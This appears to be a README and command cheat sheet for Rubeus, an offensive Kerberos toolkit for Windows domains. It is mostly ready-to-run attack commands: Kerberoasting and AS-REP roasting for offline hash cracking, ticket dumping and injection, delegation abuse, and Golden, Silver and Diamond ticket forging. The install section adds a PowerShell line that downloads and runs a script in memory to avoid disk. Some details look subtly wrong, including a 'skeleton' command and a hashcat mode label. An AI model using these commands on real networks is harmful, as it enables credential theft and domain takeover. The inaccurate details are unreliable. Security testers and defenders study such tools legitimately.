# Rubeus — Kerberos Interaction Toolkit

C# toolset for raw Kerberos interaction in Windows environments. Covers ticket requests, manipulation, forging, abuse, and Kerberos protocol attacks — all from unmanaged .NET code via the Kerberos protocol directly without relying on the Windows SSPI.

## How It Works

Rubeus implements the Kerberos protocol at the ASN.1 level using C#. It communicates directly with domain controllers on TCP/UDP 88 (KRB5 protocol), bypassing the Windows Kerberos SSPI. This gives it capabilities the native Windows APIs don't expose.

**Protocol operations:**

| Operation | Description |
|-----------|-------------|
| **AS-REQ** | Request TGT from KDC (password, NT hash, AES key, PFX certificate, or null session) |
| **TGS-REQ** | Request service tickets for any SPN |
| **S4U2Self** | Request forwardable TGS on behalf of any user (constrained delegation abuse) |
| **S4U2Proxy** | Request service ticket for target service via delegation |
| **KRB-CRED** | Build/parse ticket credentials for Pass-the-Ticket |
| **Kerberos AS-REP** | AS-REP roasting — request TGT for users without preauth |
| **Kerberos change password** | KRB5 RPC change password protocol |
| **Kerberos renew** | TGT renewal with the KDC |
| **Kerberos renew (noop)** | Renew TGT without changing session key |

**Attack primitives:**

| Attack | Description |
|--------|-------------|
| **Kerberoasting** | Request TGS tickets for service accounts → offline hash cracking |
| **AS-REP Roasting** | Request TGT for users with `DONT_REQ_PREAUTH` flag → AS-REP hash cracking |
| **Pass-the-Ticket** | Extract TGT/TGS from LSASS → inject into another session |
| **Overpass-the-Hash** | Convert NT hash → Kerberos TGT (bypass NTLM restrictions) |
| **Golden Ticket** | Forge TGT with krbtgt hash (requires domain compromise) |
| **Silver Ticket** | Forge TGS for specific service (requires service account hash) |
| **Diamond Ticket** | Decrypt legitimate TGT, modify claims, re-encrypt with krbtgt key |
| **Skeleton Key** | Patch domain controller LSASS to accept a master password |
| **Delegation Abuse** | S4U2Self + S4U2Proxy to impersonate users across services |

## Manual

### Authentication

```batch
# Password → TGT
Rubeus.exe asktgt /user:Administrator /password:'Pass!' /domain:domain.local

# NTLM hash → TGT (Overpass-the-Hash)
Rubeus.exe asktgt /user:Administrator /rc4:<ntlm-hash> /domain:domain.local

# AES key → TGT
Rubeus.exe asktgt /user:Administrator /aes256:<aes-key> /domain:domain.local

# Certificate (PFX) → TGT (PKINIT)
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:'pfx-pass' /domain:domain.local

# Certificate on smartcard → TGT
Rubeus.exe asktgt /user:Administrator /certificate:<thumbprint> /domain:domain.local
```

### Kerberoasting

```batch
# Request TGS for all SPNs
Rubeus.exe kerberoast /domain:domain.local

# With user credentials
Rubeus.exe kerberoast /domain:domain.local /user:jdoe /password:'Pass!'

# Output to file for hashcat
Rubeus.exe kerberoast /domain:domain.local /outfile:hashes.txt

# LDAP filter for specific SPNs
Rubeus.exe kerberoast /ldapfilter:"(&(samAccountType=805306368)(servicePrincipalName=*MSSQL*))"

# Fire and forget (async)
Rubeus.exe kerberoast /domain:domain.local /nowait
```

### AS-REP Roasting

```batch
# Request AS-REP for users without preauth
Rubeus.exe asreproast /domain:domain.local

# Output hashcat-compatible format
Rubeus.exe asreproast /domain:domain.local /format:hashcat /outfile:asrep.txt
```

### Pass-the-Ticket

```batch
# Export tickets from current session
Rubeus.exe dump /service:krbtgt /nowrap

# Export all tickets
Rubeus.exe dump

# Inject ticket into current session
Rubeus.exe ptt /ticket:base64_ticket_string
Rubeus.exe ptt /ticket:ticket.kirbi

# Renew TGT
Rubeus.exe renew /ticket:base64 /ptt
```

### Delegation Abuse (S4U)

```batch
# S4U2Self — request forwardable TGS for any user (if you have a trusted service)
Rubeus.exe s4u /user:svc_sql /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.domain.local /altservice:cifs /nowrap

# S4U2Self + S4U2Proxy chain
Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:http/web.domain.local /altservice:ldap /nowrap
```

### Ticket Forging

```batch
# Golden Ticket
Rubeus.exe golden /domain:domain.local /sid:S-1-5-21-<domain-sid> /krbtgt:<ntlm-hash> /user:Administrator /id:500 /ptt

# Golden Ticket with group membership
Rubeus.exe golden /domain:domain.local /sid:S-1-5-21-<domain-sid> /krbtgt:<hash> /user:Administrator /groups:512,519,518 /ptt

# Silver Ticket
Rubeus.exe silver /service:cifs/dc.domain.local /rc4:<machine-hash> /user:Administrator /domain:domain.local /sid:S-1-5-21-<domain-sid> /ptt

# Diamond Ticket (forge within a genuine TGT)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /krbkey:<krbtgt-aes256-hash> /nowrap
```

### Miscellaneous

```batch
# Ask TGS for specific SPN
Rubeus.exe asktgs /service:cifs/dc.domain.local /ticket:base64_ticket

# Skeleton Key (DC only)
Rubeus.exe skeleton /password:MasterKey!

# Descriptions of hashcat modes for ticket hashes
# Kerberoast: hashcat -m 13100
# AS-REP: hashcat -m 18200
# RC4 ticket: hashcat -m 19600
```

## Build

```powershell
# Requirements: Visual Studio with .NET desktop workload
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
# Open Rubeus.csproj in Visual Studio, build
# Or:
csc /target:exe /reference:System.dll /reference:System.IdentityModel.Tokens.Jwt.dll /reference:Newtonsoft.Json.dll /out:Rubeus.exe *.cs
```

## Install

```powershell
# Download binary from GitHub releases
Invoke-WebRequest -Uri https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe -OutFile Rubeus.exe

# Run
.\Rubeus.exe

# In-memory (avoid disk)
IEX (New-Object Net.WebClient).DownloadString('http://server/Rubeus.ps1')
```

## Package

| Manager | Command |
|---------|---------|
| GitHub Releases | https://github.com/GhostPack/Rubeus/releases |
| Unrolled PS version | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/GhostPack/Rubeus |
| Wiki | https://github.com/GhostPack/Rubeus/wiki |
| Kerberos attacks explained | https://posts.specterops.io/kerberos-attacks-part-1-kerberoasting-22e3939a3b1c |
| Blog — Rubeus & Kekeo | https://posts.specterops.io/ |
| Hashcat mode reference | https://hashcat.net/wiki/doku.php?id=example_hashes |
